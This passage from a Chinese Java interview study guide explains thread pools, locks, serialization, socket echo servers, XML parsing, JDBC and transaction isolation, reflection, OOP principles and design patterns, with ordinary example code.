newCachedThreadPool：创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。 newScheduledThreadPool：创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。 newSingleThreadExecutor：创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求。 简述synchronized 和java.util.concurrent.locks.Lock的异同？Lock是Java 5以后引入的新的API，和关键字synchronized相比主要相同点：Lock 能完成synchronized所实现的所有功能；主要不同点：Lock有比synchronized更精确的线程语义和更好的性能，而且不强制性的要求一定要获得锁。synchronized会自动释放锁，而Lock一定要求程序员手工释放，并且最好在finally 块中释放（这是释放外部资源的最好的地方）。 Java中如何实现序列化，有什么意义？序列化就是一种用来处理对象流的机制，所谓对象流也就是将对象的内容进行流化。可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。序列化是为了解决对象流读写操作时可能引发的问题（如果不进行序列化可能会存在数据乱序的问题）。要实现序列化，需要让一个类实现Serializable接口，该接口是一个标识性接口，标注该类对象是可被序列化的，然后使用一个输出流来构造一个对象输出流并通过writeObject(Object)方法就可以将实现对象写出（即保存其状态）；如果需要反序列化则可以用一个输入流建立对象输入流，然后通过readObject方法从流中读取对象。序列化除了能够实现对象的持久化之外，还能够用于对象的深度克隆。 Java中有几种类型的流？字节流和字符流。字节流继承于InputStream、OutputStream，字符流继承于Reader、Writer。在java.io 包中还有许多其他的流，主要是为了提高性能和使用方便。关于Java的I/O需要注意的有两点：一是两种对称性（输入和输出的对称性，字节和字符的对称性）；二是两种设计模式（适配器模式和装潢模式）。 用Java的套接字编程实现一个多线程的回显（echo）服务器。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.ServerSocket;import java.net.Socket; public class EchoServer &#123; private static final int ECHO_SERVER_PORT = 6789; public static void main(String[] args) &#123; try(ServerSocket server = new ServerSocket(ECHO_SERVER_PORT)) &#123; System.out.println("服务器已经启动..."); while(true) &#123; Socket client = server.accept(); new Thread(new ClientHandler(client)).start(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; private static class ClientHandler implements Runnable &#123; private Socket client; public ClientHandler(Socket client) &#123; this.client = client; &#125; @Override public void run() &#123; try(BufferedReader br = new BufferedReader(new InputStreamReader(client.getInputStream())); PrintWriter pw = new PrintWriter(client.getOutputStream())) &#123; String msg = br.readLine(); System.out.println("收到" + client.getInetAddress() + "发送的: " + msg); pw.println(msg); pw.flush(); &#125; catch(Exception ex) &#123; ex.printStackTrace(); &#125; finally &#123; try &#123; client.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; 注意：上面的代码使用了Java 7的TWR语法，由于很多外部资源类都间接的实现了AutoCloseable接口（单方法回调接口），因此可以利用TWR语法在try结束的时候通过回调的方式自动调用外部资源类的close()方法，避免书写冗长的finally代码块。此外，上面的代码用一个静态内部类实现线程的功能，使用多线程可以避免一个用户I/O操作所产生的中断影响其他用户对服务器的访问，简单的说就是一个用户的输入操作不会造成其他用户的阻塞。当然，上面的代码使用线程池可以获得更好的性能，因为频繁的创建和销毁线程所造成的开销也是不可忽视的。 下面是一段回显客户端测试代码： 12345678910111213141516171819202122import java.io.BufferedReader;import java.io.InputStreamReader;import java.io.PrintWriter;import java.net.Socket;import java.util.Scanner; public class EchoClient &#123; public static void main(String[] args) throws Exception &#123; Socket client = new Socket("localhost", 6789); Scanner sc = new Scanner(System.in); System.out.print("请输入内容: "); String msg = sc.nextLine(); sc.close(); PrintWriter pw = new PrintWriter(client.getOutputStream()); pw.println(msg); pw.flush(); BufferedReader br = new BufferedReader(new InputStreamReader(client.getInputStream())); System.out.println(br.readLine()); client.close(); &#125;&#125; 如果希望用NIO的多路复用套接字实现服务器，代码如下所示。NIO的操作虽然带来了更好的性能，但是有些操作是比较底层的，对于初学者来说还是有些难于理解。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.CharBuffer;import java.nio.channels.SelectionKey;import java.nio.channels.Selector;import java.nio.channels.ServerSocketChannel;import java.nio.channels.SocketChannel;import java.util.Iterator; public class EchoServerNIO &#123; private static final int ECHO_SERVER_PORT = 6789; private static final int ECHO_SERVER_TIMEOUT = 5000; private static final int BUFFER_SIZE = 1024; private static ServerSocketChannel serverChannel = null; private static Selector selector = null; // 多路复用选择器 private static ByteBuffer buffer = null; // 缓冲区 public static void main(String[] args) &#123; init(); listen(); &#125; private static void init() &#123; try &#123; serverChannel = ServerSocketChannel.open(); buffer = ByteBuffer.allocate(BUFFER_SIZE); serverChannel.socket().bind(new InetSocketAddress(ECHO_SERVER_PORT)); serverChannel.configureBlocking(false); selector = Selector.open(); serverChannel.register(selector, SelectionKey.OP_ACCEPT); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; &#125; private static void listen() &#123; while (true) &#123; try &#123; if (selector.select(ECHO_SERVER_TIMEOUT) != 0) &#123; Iterator&lt;SelectionKey&gt; it = selector.selectedKeys().iterator(); while (it.hasNext()) &#123; SelectionKey key = it.next(); it.remove(); handleKey(key); &#125; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; private static void handleKey(SelectionKey key) throws IOException &#123; SocketChannel channel = null; try &#123; if (key.isAcceptable()) &#123; ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel(); channel = serverChannel.accept(); channel.configureBlocking(false); channel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; channel = (SocketChannel) key.channel(); buffer.clear(); if (channel.read(buffer) &gt; 0) &#123; buffer.flip(); CharBuffer charBuffer = CharsetHelper.decode(buffer); String msg = charBuffer.toString(); System.out.println("收到" + channel.getRemoteAddress() + "的消息：" + msg); channel.write(CharsetHelper.encode(CharBuffer.wrap(msg))); &#125; else &#123; channel.close(); &#125; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); if (channel != null) &#123; channel.close(); &#125; &#125; &#125; &#125; 1234567891011121314151617181920212223import java.nio.ByteBuffer;import java.nio.CharBuffer;import java.nio.charset.CharacterCodingException;import java.nio.charset.Charset;import java.nio.charset.CharsetDecoder;import java.nio.charset.CharsetEncoder; public final class CharsetHelper &#123; private static final String UTF_8 = "UTF-8"; private static CharsetEncoder encoder = Charset.forName(UTF_8).newEncoder(); private static CharsetDecoder decoder = Charset.forName(UTF_8).newDecoder(); private CharsetHelper() &#123; &#125; public static ByteBuffer encode(CharBuffer in) throws CharacterCodingException&#123; return encoder.encode(in); &#125; public static CharBuffer decode(ByteBuffer in) throws CharacterCodingException&#123; return decoder.decode(in); &#125;&#125; XML文档定义有几种形式？它们之间有何本质区别？解析XML文档有哪几种方式？XML文档定义分为DTD和Schema两种形式，二者都是对XML语法的约束，其本质区别在于Schema本身也是一个XML文件，可以被XML解析器解析，而且可以为XML承载的数据定义类型，约束能力较之DTD更强大。对XML的解析主要有DOM（文档对象模型，Document Object Model）、SAX（Simple API for XML）和StAX（Java 6中引入的新的解析XML的方式，Streaming API for XML），其中DOM处理大型文件时其性能下降的非常厉害，这个问题是由DOM树结构占用的内存较多造成的，而且DOM解析方式必须在解析文件之前把整个文档装入内存，适合对XML的随机访问（典型的用空间换取时间的策略）；SAX是事件驱动型的XML解析方式，它顺序读取XML文件，不需要一次全部装载整个文件。当遇到像文件开头，文档结束，或者标签开头与标签结束时，它会触发一个事件，用户通过事件回调代码来处理XML文件，适合对XML的顺序访问；顾名思义，StAX把重点放在流上，实际上StAX与其他解析方式的本质区别就在于应用程序能够把XML作为一个事件流来处理。将XML作为一组事件来处理的想法并不新颖（SAX就是这样做的），但不同之处在于StAX允许应用程序代码把这些事件逐个拉出来，而不用提供在解析器方便时从解析器中接收事件的处理程序。 你在项目中哪些地方用到了XML？XML的主要作用有两个方面：数据交换和信息配置。在做数据交换时，XML将数据用标签组装成起来，然后压缩打包加密后通过网络传送给接收者，接收解密与解压缩后再从XML文件中还原相关信息进行处理，XML曾经是异构系统间交换数据的事实标准，但此项功能几乎已经被JSON（JavaScript Object Notation）取而代之。当然，目前很多软件仍然使用XML来存储配置信息，我们在很多项目中通常也会将作为配置信息的硬代码写在XML文件中，Java的很多框架也是这么做的，而且这些框架都选择了dom4j作为处理XML的工具，因为Sun公司的官方API实在不怎么好用。 补充：现在有很多时髦的软件（如Sublime）已经开始将配置文件书写成JSON格式，我们已经强烈的感受到XML的另一项功能也将逐渐被业界抛弃。 阐述JDBC操作数据库的步骤。下面的代码以连接本机的Oracle数据库为例，演示JDBC操作数据库的步骤: 加载驱动。 1Class.forName("oracle.jdbc.driver.OracleDriver"); 创建连接。 1Connection con = DriverManager.getConnection("jdbc:oracle:thin:@localhost:1521:orcl", "scott", "tiger"); 创建语句。 123PreparedStatement ps = con.prepareStatement("select * from emp where sal between ? and ?");ps.setInt(1, 1000);ps.setInt(2, 3000); 执行语句。 1ResultSet rs = ps.executeQuery(); 处理结果。 123while(rs.next()) &#123; System.out.println(rs.getInt("empno") + " - " + rs.getString("ename"));&#125; 关闭资源。 123456789finally &#123; if(con != null) &#123; try &#123; con.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 提示：关闭外部资源的顺序应该和打开的顺序相反，也就是说先关闭ResultSet、再关闭Statement、在关闭Connection。上面的代码只关闭了Connection（连接），虽然通常情况下在关闭连接时，连接上创建的语句和打开的游标也会关闭，但不能保证总是如此，因此应该按照刚才说的顺序分别关闭。此外，第一步加载驱动在JDBC 4.0中是可以省略的（自动从类路径中加载驱动），但是我们建议保留。 Statement和PreparedStatement有什么区别？哪个性能更好？与Statement相比，①PreparedStatement接口代表预编译的语句，它主要的优势在于可以减少SQL的编译错误并增加SQL的安全性（减少SQL注射攻击的可能性）；②PreparedStatement中的SQL语句是可以带参数的，避免了用字符串连接拼接SQL语句的麻烦和不安全；③当批量处理SQL或频繁执行相同的查询时，PreparedStatement有明显的性能上的优势，由于数据库可以将编译优化后的SQL语句缓存起来，下次执行相同结构的语句时就会很快（不用再次编译和生成执行计划）。 补充：为了提供对存储过程的调用，JDBC API中还提供了CallableStatement接口。存储过程（Stored Procedure）是数据库中一组为了完成特定功能的SQL语句的集合，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。虽然调用存储过程会在网络开销、安全性、性能上获得很多好处，但是存在如果底层数据库发生迁移时就会有很多麻烦，因为每种数据库的存储过程在书写上存在不少的差别。 使用JDBC操作数据库时，如何提升读取数据的性能？如何提升更新数据的性能？要提升读取数据的性能，可以指定通过结果集（ResultSet）对象的setFetchSize()方法指定每次抓取的记录数（典型的空间换时间策略）；要提升更新数据的性能可以使用PreparedStatement语句构建批处理，将若干SQL语句置于一个批处理中执行。 在进行数据库编程时，连接池有什么作用？由于创建连接和释放连接都有很大的开销（尤其是数据库服务器不在本地时，每次建立连接都需要进行TCP的三次握手，释放连接需要进行TCP四次握手，造成的开销是不可忽视的），为了提升系统访问数据库的性能，可以事先创建若干连接置于连接池中，需要时直接从连接池获取，使用结束时归还连接池而不必关闭连接，从而避免频繁创建和释放连接所造成的开销，这是典型的用空间换取时间的策略（浪费了空间存储连接，但节省了创建和释放连接的时间）。池化技术在Java开发中是很常见的，在使用线程时创建线程池的道理与此相同。基于Java的开源数据库连接池主要有：C3P0、Proxool、DBCP、BoneCP、Druid等。 补充：在计算机系统中时间和空间是不可调和的矛盾，理解这一点对设计满足性能要求的算法是至关重要的。大型网站性能优化的一个关键就是使用缓存，而缓存跟上面讲的连接池道理非常类似，也是使用空间换时间的策略。可以将热点数据置于缓存中，当用户查询这些数据时可以直接从缓存中得到，这无论如何也快过去数据库中查询。当然，缓存的置换策略等也会对系统性能产生重要影响，对于这个问题的讨论已经超出了这里要阐述的范围。 什么是DAO模式？DAO（Data Access Object）顾名思义是一个为数据库或其他持久化机制提供了抽象接口的对象，在不暴露底层持久化方案实现细节的前提下提供了各种数据访问操作。在实际的开发中，应该将所有对数据源的访问操作进行抽象化后封装在一个公共API中。用程序设计语言来说，就是建立一个接口，接口中定义了此应用程序中将会用到的所有事务方法。在这个应用程序中，当需要和数据源进行交互的时候则使用这个接口，并且编写一个单独的类来实现这个接口，在逻辑上该类对应一个特定的数据存储。DAO模式实际上包含了两个模式，一是Data Accessor（数据访问器），二是Data Object（数据对象），前者要解决如何访问数据的问题，而后者要解决的是如何用对象封装数据。 事务的ACID是指什么？ 原子性(Atomic)：事务中各项操作，要么全做要么全不做，任何一项操作的失败都会导致整个事务的失败； 一致性(Consistent)：事务结束后系统状态是一致的； 隔离性(Isolated)：并发执行的事务彼此无法看到对方的中间状态； 持久性(Durable)：事务完成后所做的改动都会被持久化，即使发生灾难性的失败。通过日志和同步备份可以在故障发生后重建数据。 补充：关于事务，在面试中被问到的概率是很高的，可以问的问题也是很多的。首先需要知道的是，只有存在并发数据访问时才需要事务。当多个事务访问同一数据时，可能会存在5类问题，包括3类数据读取问题（脏读、不可重复读和幻读）和2类数据更新问题（第1类丢失更新和第2类丢失更新）。 脏读（Dirty Read）：A事务读取B事务尚未提交的数据并在此基础上操作，而B事务执行回滚，那么A读取到的数据就是脏数据。 时间 转账事务A 取款事务B T1 开始事务 T2 开始事务 T3 查询账户余额为1000元 T4 取出500元余额修改为500元 T5 查询账户余额为500元（脏读） T6 撤销事务余额恢复为1000元 T7 汇入100元把余额修改为600元 T8 提交事务 — 不可重复读（Unrepeatable Read）：事务A重新读取前面读取过的数据，发现该数据已经被另一个已提交的事务B修改过了。 时间 转账事务A 取款事务B T1 开始事务 T2 开始事务 T3 查询账户余额为1000元 T4 查询账户余额为1000元 T5 取出100元修改余额为900元 T6 提交事务 T7 查询账户余额为900元（不可重复读） — 幻读（Phantom Read）：事务A重新执行一个查询，返回一系列符合查询条件的行，发现其中插入了被事务B提交的行。 时间 转账事务A 取款事务B T1 开始事务 T2 开始事务 T3 统计总存款为10000元 T4 新增一个存款账户存入100元 T5 提交事务 T6 再次统计总存款为10100元（幻读） — 第1类丢失更新：事务A撤销时，把已经提交的事务B的更新数据覆盖了。 时间 转账事务A 取款事务B T1 开始事务 T2 开始事务 T3 查询账户余额为1000元 T4 查询账户余额为1000元 T5 汇入100元修改余额为1100元 T6 提交事务 T7 取出100元将余额修改为900元 T8 撤销事务 T9 余额恢复为1000元（丢失更新） 第2类丢失更新：事务A覆盖事务B已经提交的数据，造成事务B所做的操作丢失。 时间 转账事务A 取款事务B T1 开始事务 T2 开始事务 T3 查询账户余额为1000元 T4 查询账户余额为1000元 T5 取出100元将余额修改为900元 T6 提交事务 T7 汇入100元将余额修改为1100元 T8 提交事务 T9 查询账户余额为1100元（丢失更新） 数据并发访问所产生的问题，在有些场景下可能是允许的，但是有些场景下可能就是致命的，数据库通常会通过锁机制来解决数据并发访问问题，按锁定对象不同可以分为表级锁和行级锁；按并发事务锁定关系可以分为共享锁和独占锁，具体的内容大家可以自行查阅资料进行了解。直接使用锁是非常麻烦的，为此数据库为用户提供了自动锁机制，只要用户指定会话的事务隔离级别，数据库就会通过分析SQL语句然后为事务访问的资源加上合适的锁，此外，数据库还会维护这些锁通过各种手段提高系统的性能，这些对用户来说都是透明的（就是说你不用理解，事实上我确实也不知道）。ANSI/ISO SQL 92标准定义了4个等级的事务隔离级别，如下表所示： 隔离级别 脏读 不可重复读 幻读 第一类丢失更新 第二类丢失更新 READ UNCOMMITED 允许 允许 允许 不允许 允许 READ COMMITTED 不允许 允许 允许 不允许 允许 REPEATABLE READ 不允许 不允许 允许 不允许 不允许 SERIALIZABLE 不允许 不允许 不允许 不允许 不允许 需要说明的是，事务隔离级别和数据访问的并发性是对立的，事务隔离级别越高并发性就越差。所以要根据具体的应用来确定合适的事务隔离级别，这个地方没有万能的原则。 JDBC中如何进行事务处理？Connection提供了事务处理的方法，通过调用setAutoCommit(false)可以设置手动提交事务；当事务完成后用commit()显式提交事务；如果在事务处理过程中发生异常则通过rollback()进行事务回滚。除此之外，从JDBC 3.0中还引入了Savepoint（保存点）的概念，允许通过代码设置保存点并让事务回滚到指定的保存点。 JDBC能否处理Blob和Clob？Blob是指二进制大对象（Binary Large Object），而Clob是指大字符对象（Character Large Objec），因此其中Blob是为存储大的二进制数据而设计的，而Clob是为存储大的文本数据而设计的。JDBC的PreparedStatement和ResultSet都提供了相应的方法来支持Blob和Clob操作。下面的代码展示了如何使用JDBC操作LOB：下面以MySQL数据库为例，创建一个张有三个字段的用户表，包括编号（id）、姓名（name）和照片（photo），建表语句如下： 123456create table tb_user(id int primary key auto_increment,name varchar(20) unique not null,photo longblob); 下面的Java代码向数据库中插入一条记录： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.sql.Connection;import java.sql.DriverManager;import java.sql.PreparedStatement;import java.sql.SQLException; class JdbcLobTest &#123; public static void main(String[] args) &#123; Connection con = null; try &#123; // 1. 加载驱动（Java6以上版本可以省略） Class.forName("com.mysql.jdbc.Driver"); // 2. 建立连接 con = DriverManager.getConnection("jdbc:mysql://localhost:3306/test", "root", "123456"); // 3. 创建语句对象 PreparedStatement ps = con.prepareStatement("insert into tb_user values (default, ?, ?)"); ps.setString(1, "骆昊"); // 将SQL语句中第一个占位符换成字符串 try (InputStream in = new FileInputStream("test.jpg")) &#123; // Java 7的TWR ps.setBinaryStream(2, in); // 将SQL语句中第二个占位符换成二进制流 // 4. 发出SQL语句获得受影响行数 System.out.println(ps.executeUpdate() == 1 ? "插入成功" : "插入失败"); &#125; catch(IOException e) &#123; System.out.println("读取照片失败!"); &#125; &#125; catch (ClassNotFoundException | SQLException e) &#123; // Java 7的多异常捕获 e.printStackTrace(); &#125; finally &#123; // 释放外部资源的代码都应当放在finally中保证其能够得到执行 try &#123; if(con != null &amp;&amp; !con.isClosed()) &#123; con.close(); // 5. 释放数据库连接 con = null; // 指示垃圾回收器可以回收该对象 &#125; &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 简述正则表达式及其用途。在编写处理字符串的程序时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。 说明：计算机诞生初期处理的信息几乎都是数值，但是时过境迁，今天我们使用计算机处理的信息更多的时候不是数值而是字符串，正则表达式就是在进行字符串匹配和处理的时候最为强大的工具，绝大多数语言都提供了对正则表达式的支持。 Java中是如何支持正则表达式操作的？Java中的String类提供了支持正则表达式操作的方法，包括：matches()、replaceAll()、replaceFirst()、split()。此外，Java中可以用Pattern类表示正则表达式对象，它提供了丰富的API进行各种正则表达式操作，请参考下面面试题的代码。 面试题： - 如果要从字符串中截取第一个英文左括号之前的字符串，例如：北京市(朝阳区)(西城区)(海淀区)，截取结果为：北京市，那么正则表达式怎么写？ 1234567891011121314import java.util.regex.Matcher;import java.util.regex.Pattern; class RegExpTest &#123; public static void main(String[] args) &#123; String str = "北京市(朝阳区)(西城区)(海淀区)"; Pattern p = Pattern.compile(".*?(?=\\()"); Matcher m = p.matcher(str); if(m.find()) &#123; System.out.println(m.group()); &#125; &#125;&#125; 说明：上面的正则表达式中使用了懒惰匹配和前瞻，如果不清楚这些内容，推荐读一下网上很有名的《正则表达式30分钟入门教程》。 获得一个类的类对象有哪些方式？ 方法1：类型.class，例如：String.class 方法2：对象.getClass()，例如：”hello”.getClass() 方法3：Class.forName()，例如：Class.forName(“java.lang.String”) 如何通过反射创建对象？ 方法1：通过类对象调用newInstance()方法，例如：String.class.newInstance() 方法2：通过类对象的getConstructor()或getDeclaredConstructor()方法获得构造器（Constructor）对象并调用其newInstance()方法创建对象，例如：String.class.getConstructor(String.class).newInstance(“Hello”); 如何通过反射获取和设置对象私有字段的值？可以通过类对象的getDeclaredField()方法字段（Field）对象，然后再通过字段对象的setAccessible(true)将其设置为可以访问，接下来就可以通过get/set方法来获取/设置字段的值了。下面的代码实现了一个反射的工具类，其中的两个静态方法分别用于获取和设置私有字段的值，字段可以是基本类型也可以是对象类型且支持多级对象操作，例如ReflectionUtil.get(dog, “owner.car.engine.id”);可以获得dog对象的主人的汽车的引擎的ID号。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Modifier;import java.util.ArrayList;import java.util.List; /** * 反射工具类 * @author 骆昊 * */public class ReflectionUtil &#123; private ReflectionUtil() &#123; throw new AssertionError(); &#125; /** * 通过反射取对象指定字段(属性)的值 * @param target 目标对象 * @param fieldName 字段的名字 * @throws 如果取不到对象指定字段的值则抛出异常 * @return 字段的值 */ public static Object getValue(Object target, String fieldName) &#123; Class&lt;?&gt; clazz = target.getClass(); String[] fs = fieldName.split("\\."); try &#123; for(int i = 0; i &lt; fs.length - 1; i++) &#123; Field f = clazz.getDeclaredField(fs[i]); f.setAccessible(true); target = f.get(target); clazz = target.getClass(); &#125; Field f = clazz.getDeclaredField(fs[fs.length - 1]); f.setAccessible(true); return f.get(target); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; &#125; /** * 通过反射给对象的指定字段赋值 * @param target 目标对象 * @param fieldName 字段的名称 * @param value 值 */ public static void setValue(Object target, String fieldName, Object value) &#123; Class&lt;?&gt; clazz = target.getClass(); String[] fs = fieldName.split("\\."); try &#123; for(int i = 0; i &lt; fs.length - 1; i++) &#123; Field f = clazz.getDeclaredField(fs[i]); f.setAccessible(true); Object val = f.get(target); if(val == null) &#123; Constructor&lt;?&gt; c = f.getType().getDeclaredConstructor(); c.setAccessible(true); val = c.newInstance(); f.set(target, val); &#125; target = val; clazz = target.getClass(); &#125; Field f = clazz.getDeclaredField(fs[fs.length - 1]); f.setAccessible(true); f.set(target, value); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; &#125; &#125; 如何通过反射调用对象的方法？12345678910import java.lang.reflect.Method; class MethodInvokeTest &#123; public static void main(String[] args) throws Exception &#123; String str = "hello"; Method m = str.getClass().getMethod("toUpperCase"); System.out.println(m.invoke(str)); // HELLO &#125;&#125; 简述一下面向对象的”六原则一法则”。 单一职责原则：一个类只做它该做的事情。（单一职责原则想表达的就是”高内聚”，写代码最终极的原则只有六个字”高内聚、低耦合”，就如同葵花宝典或辟邪剑谱的中心思想就八个字”欲练此功必先自宫”，所谓的高内聚就是一个代码模块只完成一项功能，在面向对象中，如果只让一个类完成它该做的事，而不涉及与它无关的领域就是践行了高内聚的原则，这个类就只有单一职责。我们都知道一句话叫”因为专注，所以专业”，一个对象如果承担太多的职责，那么注定它什么都做不好。这个世界上任何好的东西都有两个特征，一个是功能单一，好的相机绝对不是电视购物里面卖的那种一个机器有一百多种功能的，它基本上只能照相；另一个是模块化，好的自行车是组装车，从减震叉、刹车到变速器，所有的部件都是可以拆卸和重新组装的，好的乒乓球拍也不是成品拍，一定是底板和胶皮可以拆分和自行组装的，一个好的软件系统，它里面的每个功能模块也应该是可以轻易的拿到其他系统中使用的，这样才能实现软件复用的目标。） 开闭原则：软件实体应当对扩展开放，对修改关闭。（在理想的状态下，当我们需要为一个软件系统增加新功能时，只需要从原来的系统派生出一些新类就可以，不需要修改原来的任何一行代码。要做到开闭有两个要点：①抽象是关键，一个系统中如果没有抽象类或接口系统就没有扩展点；②封装可变性，将系统中的各种可变因素封装到一个继承结构中，如果多个可变因素混杂在一起，系统将变得复杂而换乱，如果不清楚如何封装可变性，可以参考《设计模式精解》一书中对桥梁模式的讲解的章节。） 依赖倒转原则：面向接口编程。（该原则说得直白和具体一些就是声明方法的参数类型、方法的返回类型、变量的引用类型时，尽可能使用抽象类型而不用具体类型，因为抽象类型可以被它的任何一个子类型所替代，请参考下面的里氏替换原则。）里氏替换原则：任何时候都可以用子类型替换掉父类型。（关于里氏替换原则的描述，Barbara Liskov女士的描述比这个要复杂得多，但简单的说就是能用父类型的地方就一定能使用子类型。里氏替换原则可以检查继承关系是否合理，如果一个继承关系违背了里氏替换原则，那么这个继承关系一定是错误的，需要对代码进行重构。例如让猫继承狗，或者狗继承猫，又或者让正方形继承长方形都是错误的继承关系，因为你很容易找到违反里氏替换原则的场景。需要注意的是：子类一定是增加父类的能力而不是减少父类的能力，因为子类比父类的能力更多，把能力多的对象当成能力少的对象来用当然没有任何问题。） 接口隔离原则：接口要小而专，绝不能大而全。（臃肿的接口是对接口的污染，既然接口表示能力，那么一个接口只应该描述一种能力，接口也应该是高度内聚的。例如，琴棋书画就应该分别设计为四个接口，而不应设计成一个接口中的四个方法，因为如果设计成一个接口中的四个方法，那么这个接口很难用，毕竟琴棋书画四样都精通的人还是少数，而如果设计成四个接口，会几项就实现几个接口，这样的话每个接口被复用的可能性是很高的。Java中的接口代表能力、代表约定、代表角色，能否正确的使用接口一定是编程水平高低的重要标识。） 合成聚合复用原则：优先使用聚合或合成关系复用代码。（通过继承来复用代码是面向对象程序设计中被滥用得最多的东西，因为所有的教科书都无一例外的对继承进行了鼓吹从而误导了初学者，类与类之间简单的说有三种关系，Is-A关系、Has-A关系、Use-A关系，分别代表继承、关联和依赖。其中，关联关系根据其关联的强度又可以进一步划分为关联、聚合和合成，但说白了都是Has-A关系，合成聚合复用原则想表达的是优先考虑Has-A关系而不是Is-A关系复用代码，原因嘛可以自己从百度上找到一万个理由，需要说明的是，即使在Java的API中也有不少滥用继承的例子，例如Properties类继承了Hashtable类，Stack类继承了Vector类，这些继承明显就是错误的，更好的做法是在Properties类中放置一个Hashtable类型的成员并且将其键和值都设置为字符串来存储数据，而Stack类的设计也应该是在Stack类中放一个Vector对象来存储数据。记住：任何时候都不要继承工具类，工具是可以拥有并可以使用的，而不是拿来继承的。） 迪米特法则：迪米特法则又叫最少知识原则，一个对象应当对其他对象有尽可能少的了解。（迪米特法则简单的说就是如何做到”低耦合”，门面模式和调停者模式就是对迪米特法则的践行。对于门面模式可以举一个简单的例子，你去一家公司洽谈业务，你不需要了解这个公司内部是如何运作的，你甚至可以对这个公司一无所知，去的时候只需要找到公司入口处的前台美女，告诉她们你要做什么，她们会找到合适的人跟你接洽，前台的美女就是公司这个系统的门面。再复杂的系统都可以为用户提供一个简单的门面，Java Web开发中作为前端控制器的Servlet或Filter不就是一个门面吗，浏览器对服务器的运作方式一无所知，但是通过前端控制器就能够根据你的请求得到相应的服务。调停者模式也可以举一个简单的例子来说明，例如一台计算机，CPU、内存、硬盘、显卡、声卡各种设备需要相互配合才能很好的工作，但是如果这些东西都直接连接到一起，计算机的布线将异常复杂，在这种情况下，主板作为一个调停者的身份出现，它将各个设备连接在一起而不需要每个设备之间直接交换数据，这样就减小了系统的耦合度和复杂度，如下图所示。迪米特法则用通俗的话来将就是不要和陌生人打交道，如果真的需要，找一个自己的朋友，让他替你和陌生人打交道。） 简述一下你了解的设计模式。所谓设计模式，就是一套被反复使用的代码设计经验的总结（情境中一个问题经过证实的一个解决方案）。使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。设计模式使人们可以更加简单方便的复用成功的设计和体系结构。将已证实的技术表述成设计模式也会使新系统开发者更加容易理解其设计思路。在GoF的《Design Patterns: Elements of Reusable Object-Oriented Software》中给出了三类（创建型[对类的实例化过程的抽象化]、结构型[描述如何将类或对象结合在一起形成更大的结构]、行为型[对在不同的对象之间划分责任和算法的抽象化]）共23种设计模式，包括：Abstract Factory（抽象工厂模式），Builder（建造者模式），Factory Method（工厂方法模式），Prototype（原始模型模式），Singleton（单例模式）；Facade（门面模式），Adapter（适配器模式），Bridge（桥梁模式），Composite（合成模式），Decorator（装饰模式），Flyweight（享元模式），Proxy（代理模式）；Command（命令模式），Interpreter（解释器模式），Visitor（访问者模式），Iterator（迭代子模式），Mediator（调停者模式），Memento（备忘录模式），Observer（观察者模式），State（状态模式），Strategy（策略模式），Template Method（模板方法模式）， Chain Of Responsibility（责任链模式）。面试被问到关于设计模式的知识时，可以拣最常用的作答，例如： 工厂模式：工厂类可以根据条件生成不同的子类实例，这些子类有一个公共的抽象父类并且实现了相同的方法，但是这些方法针对不同的数据进行了不同的操作（多态方法）。当得到子类的实例后，开发人员可以调用基类中的方法而不必考虑到底返回的是哪一个子类的实例。 代理模式：给一个对象提供一个代理对象，并由代理对象控制原对象的引用。实际开发中，按照使用目的的不同，代理可以分为：远程代理、虚拟代理、保护代理、Cache代理、防火墙代理、同步化代理、智能引用代理。 适配器模式：把一个类的接口变换成客户端所期待的另一种接口，从而使原本因接口不匹配而无法在一起使用的类能够一起工作。 模板方法模式：提供一个抽象类，将部分逻辑以具体方法或构造器的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。不同的子类可以以不同的方式实现这些抽象方法（多态实现），从而实现不同的业务逻辑。除此之外，还可以讲讲上面提到的门面模式、桥梁模式、单例模式、装潢模式（Collections工具类和I/O系统中都使用装潢模式）等，反正基本原则就是拣自己最熟悉的、用得最多的作答，以免言多必失。 用Java写一个单例类。 饿汉式单例 1234567public class Singleton &#123; private Singleton()&#123;&#125; private static Singleton instance = new Singleton(); public static Singleton getInstance()&#123; return instance; &#125;&#125; 懒汉式单例 12345678public class Singleton &#123; private static Singleton instance = null; private Singleton() &#123;&#125; public static synchronized Singleton getInstance()&#123; if (instance == null) instance ＝ new Singleton(); return instance; &#125;&#125; 